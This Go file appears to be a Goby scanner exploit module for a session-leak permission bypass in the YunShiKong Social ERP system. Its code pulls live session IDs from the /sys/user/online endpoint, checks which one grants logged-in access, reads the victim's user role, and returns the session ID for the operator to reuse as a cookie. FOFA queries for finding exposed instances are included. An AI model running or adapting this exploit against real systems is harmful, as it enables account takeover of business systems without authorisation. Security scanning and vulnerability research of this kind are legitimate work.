package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YunShiKong-Social-ERP online Permission Bypass Vulnerability",
    "Description": "<p>YunShiKong-Social-ERP the product adopts JAVA language and Oracle database, integrates the advanced management concept of UF software, brings together the characteristic management needs of various pharmaceutical enterprises, and improves the competitiveness of enterprises and reduces personnel costs by standardizes various circulation links. Finally, to achieve the goal of fully serving the information construction of pharmaceutical wholesale and retail chain enterprises, it is a one-stop management system for pharmaceutical circulation industry that fully conforms to the latest GSP requirements. </p><p>The  ERP online interface has a SESSIONID leak. Unauthorized attackers can log in to the background using the SESSIONID, causing damage to the system.</p>",
    "Product": "YunShiKong-Social-ERP",
    "Homepage": "http://www.ysk360.com/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-07",
    "Author": "hhh3156",
    "FofaQuery": "(body=\"云时空社会化商业ERP系统\" || body=\"yunlogo_home.png\") && title=\"云时空\"",
    "GobyQuery": "(body=\"云时空社会化商业ERP系统\" || body=\"yunlogo_home.png\") && title=\"云时空\"",
    "Level": "2",
    "Impact": "<p>The  ERP online interface has a SESSIONID leak. Unauthorized attackers can log in to the background using the SESSIONID, causing damage to the system.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "Info,SESSIONID",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "HW-2024"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "云时空社会化商业ERP系统 online 权限绕过漏洞",
            "Product": "云时空社会化商业ERP系统",
            "Description": "<p>云时空社会化商业ERP(简称云时空ERP),该产品采用JAVA语言和Oracle数据库,融合用友软件的先进管理理念，汇集各医药企业特色管理需求，通过规范各个流通环节从而提高企业竞争力、降低人员成本，最终实现全面服务于医药批发、零售连锁企业的信息化建设的目标，是一款全面贴合最新GSP要求的医药流通行业一站式管理系统。<br></p><p>云时空ERP online 接口存在SESSIONID泄露，未授权的攻击者可以凭借SESSIONID登录后台，对系统造成危害。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a>&nbsp;</p><p>2、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>云时空ERP online 接口存在SESSIONID泄露，未授权的攻击者可以凭借SESSIONID登录后台，对系统造成危害。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "YunShiKong-Social-ERP online Permission Bypass Vulnerability",
            "Product": "YunShiKong-Social-ERP",
            "Description": "<p>YunShiKong-Social-ERP the product adopts JAVA language and Oracle database, integrates the advanced management concept of UF software, brings together the characteristic management needs of various pharmaceutical enterprises, and improves the competitiveness of enterprises and reduces personnel costs by standardizes various circulation links. Finally, to achieve the goal of fully serving the information construction of pharmaceutical wholesale and retail chain enterprises, it is a one-stop management system for pharmaceutical circulation industry that fully conforms to the latest GSP requirements.&nbsp;</p><p>The&nbsp; ERP online interface has a SESSIONID leak. Unauthorized attackers can log in to the background using the SESSIONID, causing damage to the system.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"http://www.ysk360.com/\">http://www.ysk360.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The&nbsp; ERP online interface has a SESSIONID leak. Unauthorized attackers can log in to the background using the SESSIONID, causing damage to the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9921"
}`

	sendPayload_LAPVkvpa30v5KAMSOekcmnw32PA := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, sessionid string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			if sessionid != "" {
				GetRequest.Header.Store("Cookie", "emscm.session.id="+sessionid)
			}
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path := "/sys/user/online"

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
		}

		resp, err := setGetRequest(hostInfo, path, "", header)
		if err != nil || resp.StatusCode != 200 {
			return false, "", ""
		}

		regular := `"sessionid":"([\s\S]*?)"`

		makeRegular := func(RegularContent string, RegularUrl string) ([][]string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return nil, fmt.Errorf("can't match value")
			}
			getname := reRequest.FindAllStringSubmatch(RegularContent, -1)
			return getname, nil
		}

		sessionids, err := makeRegular(resp.RawBody, regular)
		if err != nil || sessionids == nil {
			return false, "", ""
		}
		sessionid := ""

		for i := range sessionids {
			sessionid = sessionids[i][1]
			resp2, err := setGetRequest(hostInfo, `/`, sessionid, header)
			if err == nil && resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, `location.href='/index'`) {
				break
			}
		}

		resp3, err := setGetRequest(hostInfo, "/sys/user/info", sessionid, header)
		if err != nil || resp3.StatusCode != 200 {
			return false, "", ""
		}
		regular2 := `<label>用户角色：</label>([\S\s]*?)<br>`

		makeRegular2 := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}

		Info, err := makeRegular2(resp3.RawBody, regular2)
		if err != nil || Info == "" {
			return false, "", ""
		}

		return true, sessionid, Info
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, _ := sendPayload_LAPVkvpa30v5KAMSOekcmnw32PA(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.FixedHostInfo + `/sys/user/online`
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			resbool, sessionid, Info := sendPayload_LAPVkvpa30v5KAMSOekcmnw32PA(expResult.HostInfo)
			if resbool == false {
				expResult.Success = false
				expResult.Output = "Exploitation failed"
				return expResult
			}

			attacktype := goutils.B2S(ss.Params["attackType"])

			if attacktype == "SESSIONID" {
				expResult.Output = "SESSIONID: " + sessionid + "\n请在Cookie中自行复制替换SESSIONID"
				expResult.Success = true

			} else if attacktype == "Info" {
				expResult.Success = true
				expResult.Output = "当前SESSIONID的用户角色为： " + Info

			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
